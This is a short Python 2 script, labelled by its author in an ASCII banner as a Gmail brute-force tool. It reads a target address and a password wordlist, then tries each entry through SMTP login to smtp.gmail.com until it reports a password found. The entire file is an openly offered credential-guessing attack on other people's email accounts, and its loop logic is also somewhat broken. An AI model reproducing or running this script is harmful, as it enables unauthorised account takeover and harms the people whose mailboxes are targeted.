import smtplib
from os import system
def hell():
                    mawar  = "\033[31;m1"
                    susu1    = "\033[37;1m"
                    hole1    = "\033[32;1m"

                    print susu1+"+=========================================================+"
                    print hole1+"|+[-- ALI-MOHAMAD : Facebook & youtube & Github --]       |"
                    print hole1+"|+https://www.facebook.com/ALi20Hack                      |" 
                    print hole1+"|+https://github.com/Ali20hack                            |"
                    print hole1+"|+https://www.youtube.com/channel/UCkOu7kHM1aJkJw87d2FlG9Q|"
                    print susu1+"+=========================================================+"
                    print "                 |^^^^^^^^^^^^^^^^^^^^^^^^^^|"
                    print "                 | !-Coded By ALi-MOHAMAD   |"
                    print "                 |!-Tools Bruteforce Gmail  |"
                    print "                 |!-Syrian-hacker:ALi20hack |"
                    print "                 |__________________________|\n"

hell()
mawar = "\033[31;1m"

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(mawar+"-->[!] Enter Email Target: ")
passwd = raw_input(mawar+"-->[!] Path and Name Wordlist: ")
passwd = open(passwd, "r")

for password in passwd:
    try:
                            smtpserver.login(user, password)
                            system("clear")
                            hell()
                            print mawar+"\n"
                            print mawar+"-->[!]--ALi--: Password Found :" + password
                            break
    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print "\n"
                            print mawar+"-->[!] Password Wrong!:" + password
                            break
                else:
                        print mawar+"-->[!] Password Wrong!:" + password

